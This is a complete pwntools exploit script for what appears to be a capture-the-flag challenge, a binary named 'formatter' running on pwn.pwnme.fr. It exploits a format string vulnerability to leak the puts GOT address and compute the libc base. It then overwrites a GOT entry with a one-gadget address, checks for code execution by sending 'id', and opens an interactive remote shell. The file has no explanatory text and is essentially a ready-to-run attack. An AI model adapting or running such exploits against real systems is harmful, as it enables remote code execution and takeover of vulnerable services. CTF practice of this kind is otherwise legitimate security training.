from pwn import *
import time

host	= "pwn.pwnme.fr"
port	= 7009

# get symbols
elf = ELF("./formatter")
libc=ELF("./libc-2.27.so")
context.clear(arch = 'amd64')

# Connection
io = remote(host,port)
	

# Leak
pl =b"%7$s-put"+p64(elf.symbols["got.puts"])
io.sendline(pl)
leak=io.recvuntil(b"-put").split(b" ")[-1].split(b"-")[0][::-1].hex()
leak=int('0x'+leak,16)
offset=leak - libc.symbols["puts"]

# try onegadget
where=offset+0x4f2a5*0+0x4f302*0+0x10a2fc*1+0xe54f7*0+0xe534f*0
writes = {0x404018:  where}
pl = fmtstr_payload(6, writes, numbwritten=0)
io.sendline(pl)
	
# check
io.sendline(b"id")
io.sendline(b"id")
	
# user
print(io.interactive())


